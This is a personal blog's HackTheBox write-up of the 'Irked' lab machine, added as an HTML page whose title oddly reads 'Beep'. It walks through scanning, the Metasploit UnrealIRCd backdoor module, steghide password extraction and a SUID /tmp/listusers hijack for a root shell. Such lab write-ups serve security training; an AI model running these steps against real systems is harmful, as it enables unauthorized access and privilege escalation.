@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+
+<!--
+  portfolYOU Jekyll theme by yousinix
+  Free for personal and commercial use under the MIT license
+  https://github.com/yousinix/portfolYOU
+-->
+
+<html lang="en" class="h-100">
+
+<head>
+
+  
+  
+  
+
+  
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Beep">
+  <meta property="og:description" content="HackTheBox - Medium">
+  <meta property="og:image" content="/assets/img/profile.png">
+
+  <title>Beep</title>
+  <meta name="description" content="HackTheBox - Medium">
+
+  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">
+
+  <!-- Theme style -->
+  <script src="/assets/js/theme.js"></script>
+
+  <!-- Font Awesome CDN -->
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css">
+
+  <!-- Bootstrap CSS CDN -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
+
+  <!-- Animate CSS CDN -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.css">
+
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="/assets/css/style.css">
+
+</head>
+
+
+<body class="h-100 d-flex flex-column">
+
+  <main class="flex-shrink-0 container mt-5">
+    <nav class="navbar navbar-expand-lg navbar-themed">
+
+  <a class="navbar-brand" href="/"><h5><b>Akshay Chavan</b></h5></a>
+
+  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+    <i class="fas fa-1x fa-bars text-themed"></i>
+  </button>
+
+  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
+    <div class="navbar-nav ml-auto"><a class="nav-item nav-link " href="/projects/">Projects</a>
+
+      <a class="nav-item nav-link active" href="/blog/">Blog</a>
+
+      <a class="nav-item nav-link " href="/about/">About</a>
+
+      
+
+      <span id="theme-toggler" class="nav-item nav-link" role="button" onclick="toggleTheme()"></span>
+    </div>
+  </div>
+
+</nav>
+    <div class="col-lg-10 mx-auto mt-5 markdown-body">
+  <h1><b>Beep</b></h1>
+
+<p class="post-metadata text-muted">
+  04 January 2024 -  
+  <b>4 mins read time</b>
+
+  <br>Tags: 
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#unrealircdbackdoor">
+      <span class="tag badge badge-pill text-primary border border-primary">UnrealIRCdBackdoor</span>
+    </a>
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#steganography">
+      <span class="tag badge badge-pill text-primary border border-primary">Steganography</span>
+    </a>
+    </p>
+
+<p><img src="/assets/ctf/htb_media/irked_infocard.png" alt="infocard" /></p>
+
+<h2 id="introduction">Introduction</h2>
+
+<p>Irked is a medium-difficulty machine on HackTheBox that involves exploiting a backdoor in the UnrealIRCd service to gain initial access and leveraging SUID binaries for privilege escalation. This walkthrough will guide you through the process of compromising the Irked machine, from initial reconnaissance to gaining root access.</p>
+
+<h2 id="initial-enumeration">Initial Enumeration</h2>
+
+<h3 id="nmap-scan">Nmap Scan</h3>
+
+<p>The first step in any penetration test is enumeration. We start by scanning the target machine using Nmap to identify open ports and services.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p-</span> <span class="nv">$ip</span> <span class="o">&gt;</span> nmap/service.log
+</code></pre></div></div>
+
+<p><strong>Nmap Results:</strong></p>
+
+<pre><code class="language-nmap">Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-06 04:20 EST
+Nmap scan report for 10.10.10.117
+Host is up (0.33s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
+| ssh-hostkey: 
+|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
+|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
+80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+111/tcp  open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          34818/udp   status
+|   100024  1          38670/tcp   status
+|   100024  1          47035/udp6  status
+|_  100024  1          49457/tcp6  status
+6697/tcp open  irc     UnrealIRCd
+8067/tcp open  irc     UnrealIRCd
+Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 136.54 seconds
+</code></pre>
+
+<p><strong>Key Services Identified:</strong></p>
+
+<ul>
+  <li><strong>SSH (22):</strong> OpenSSH 6.7p1</li>
+  <li><strong>HTTP (80):</strong> Apache httpd 2.4.10</li>
+  <li><strong>IRC (6697, 8067):</strong> UnrealIRCd</li>
+</ul>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p>Visiting the HTTP service on port 80 revealed a static image with a smiley emoji. We added <code class="language-plaintext highlighter-rouge">irked.htb</code> to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file to resolve the domain.</p>
+
+<p><img src="/assets/ctf/htb_media/irked_homepage.png" alt="homepage" /></p>
+
+<p><strong>Directory Brute-Forcing:</strong></p>
+
+<p>Using <code class="language-plaintext highlighter-rouge">ffuf</code>, we discovered a directory named <code class="language-plaintext highlighter-rouge">manual</code>, which is typical Apache documentation.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-u</span> http://irked.htb/FUZZ
+</code></pre></div></div>
+
+<p><img src="/assets/ctf/htb_media/irked_ffuf.png" alt="ffuf" /></p>
+
+<p><strong>Key Directory Identified:</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">/manual</code></li>
+</ul>
+
+<h2 id="exploiting-unrealircd">Exploiting UnrealIRCd</h2>
+
+<h3 id="identifying-the-vulnerability">Identifying the Vulnerability</h3>
+
+<p>The Nmap scan revealed an UnrealIRCd service running on ports 6697 and 8067. Researching UnrealIRCd vulnerabilities identified a backdoor command execution vulnerability in version 3.2.8.1.</p>
+
+<p><img src="/assets/ctf/htb_media/irked_version.png" alt="info" /></p>
+
+<p><strong>Exploit Analysis:</strong></p>
+
+<p>The exploit leverages a backdoor in the UnrealIRCd service, allowing arbitrary command execution by sending a specially crafted payload.</p>
+
+<h3 id="gaining-initial-access">Gaining Initial Access</h3>
+
+<p>Using the Metasploit module <code class="language-plaintext highlighter-rouge">exploit/unix/irc/unreal_ircd_3281_backdoor</code>, we gained a shell on the machine.</p>
+
+<p><strong>Metasploit Module Execution:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> use exploit/unix/irc/unreal_ircd_3281_backdoor
+msf6 exploit<span class="o">(</span>unix/irc/unreal_ircd_3281_backdoor<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS 10.10.10.117
+msf6 exploit<span class="o">(</span>unix/irc/unreal_ircd_3281_backdoor<span class="o">)</span> <span class="o">&gt;</span> exploit
+</code></pre></div></div>
+
+<p><strong>Reverse Shell Obtained:</strong></p>
+
+<p><img src="/assets/ctf/htb_media/irked_newshell.png" alt="Reverse Shell" /></p>
+
+<h3 id="establishing-user-access">Establishing User Access</h3>
+
+<p>We found the <code class="language-plaintext highlighter-rouge">user.txt</code> flag in <code class="language-plaintext highlighter-rouge">/home/djmardov/Documents/user.txt</code> but lacked the necessary permissions to read it. Further enumeration revealed a <code class="language-plaintext highlighter-rouge">.backup</code> file in the same directory.</p>
+
+<p><strong>Backup File Contents:</strong></p>
+
+<p><img src="/assets/ctf/htb_media/irked_backup.png" alt="Backup File" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">.backup</code> file contained a password hint for steganography. Using <code class="language-plaintext highlighter-rouge">steghide</code>, we extracted hidden data from the <code class="language-plaintext highlighter-rouge">irked.jpg</code> image.</p>
+
+<p><strong>Steghide Extraction:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>steghide extract <span class="nt">-sf</span> irked.jpg
+</code></pre></div></div>
+
+<p><strong>Extracted Data:</strong></p>
+
+<p><img src="/assets/ctf/htb_media/irked_steghide.png" alt="Steghide Output" /></p>
+
+<p>Using the extracted password, we logged into the <code class="language-plaintext highlighter-rouge">djmardov</code> account via SSH.</p>
+
+<p><strong>SSH Access:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh djmardov@10.10.10.117
+</code></pre></div></div>
+
+<p><strong>User Shell Obtained:</strong></p>
+
+<p><img src="/assets/ctf/htb_media/irked_user.png" alt="User Shell" /></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<h3 id="enumerating-suid-binaries">Enumerating SUID Binaries</h3>
+
+<p>We identified a suspicious SUID binary <code class="language-plaintext highlighter-rouge">/usr/bin/viewuser</code>.</p>
+
+<p><strong>SUID Binary:</strong></p>
+
+<p><img src="/assets/ctf/htb_media/irked_suid.png" alt="SUID Binary" /></p>
+
+<h3 id="exploiting-the-suid-binary">Exploiting the SUID Binary</h3>
+
+<p>The <code class="language-plaintext highlighter-rouge">/usr/bin/viewuser</code> binary attempted to execute a file named <code class="language-plaintext highlighter-rouge">listusers</code> in the <code class="language-plaintext highlighter-rouge">/tmp</code> directory. We created a malicious <code class="language-plaintext highlighter-rouge">listusers</code> script to gain a root shell.</p>
+
+<p><strong>Malicious Script:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"/bin/bash"</span> <span class="o">&gt;</span> /tmp/listusers
+<span class="nb">chmod</span> +x /tmp/listusers
+</code></pre></div></div>
+
+<p><strong>Executing the Binary:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/viewuser
+</code></pre></div></div>
+
+<p><strong>Root Shell Obtained:</strong></p>
+
+<p><img src="/assets/ctf/htb_media/irked_root.png" alt="Root Shell" /></p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>The Irked machine on HackTheBox provided a comprehensive challenge, encompassing service enumeration, UnrealIRCd exploitation, and SUID privilege escalation. By methodically enumerating services, exploiting discovered vulnerabilities, and leveraging SUID binaries, we successfully compromised the machine and gained root access. This walkthrough underscores the importance of thorough enumeration and the effective use of discovered vulnerabilities in penetration testing.</p>
+
+
+
+
+</div>
+  </main>
+  <footer class="mt-auto py-3 text-center">
+
+  <small class="text-muted mb-2">
+    <i class="fas fa-code"></i> with <i class="fas fa-heart"></i>
+    by <strong>Akshay Chavan</strong>
+  </small>
+
+  <div class="container-fluid justify-content-center"><a class="social mx-1"  href="mailto:akschavan100@gmail.com"
+       style="color: #6c757d"
+       onMouseOver="this.style.color='#db4437'"
+       onMouseOut="this.style.color='#6c757d'">
+      <i class="fas fa-envelope fa-1x"></i>
+    </a><a class="social mx-1"  href="https://www.github.com/akshaychavan10"
+       style="color: #6c757d"
+       onMouseOver="this.style.color='#333333'"
+       onMouseOut="this.style.color='#6c757d'">
+      <i class="fab fa-github fa-1x"></i>
+    </a><a class="social mx-1"  href="https://www.linkedin.com/in/akshaychavan07"
+       style="color: #6c757d"
+       onMouseOver="this.style.color='#007bb5'"
+       onMouseOut="this.style.color='#6c757d'">
+      <i class="fab fa-linkedin-in fa-1x"></i>
+    </a>
+
+</div><small id="attribution">
+    theme <a href="https://github.com/yousinix/portfolYOU">portfolYOU</a>
+  </small>
+
+</footer>
+
+  
+  <!-- GitHub Buttons -->
+<script async defer src="https://buttons.github.io/buttons.js"></script>
+
+<!-- jQuery CDN -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<!-- Popper.js CDN -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>
+
+<!-- Bootstrap JS CDN -->
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+
+<!-- wow.js CDN & Activation -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.js"></script>
+<script> new WOW().init(); </script>
+
+<!-- Initialize all tooltips -->
+<script>
+$(function () {
+    $('[data-toggle="tooltip"]').tooltip()
+})
+</script>
+</body>
+
+</html>
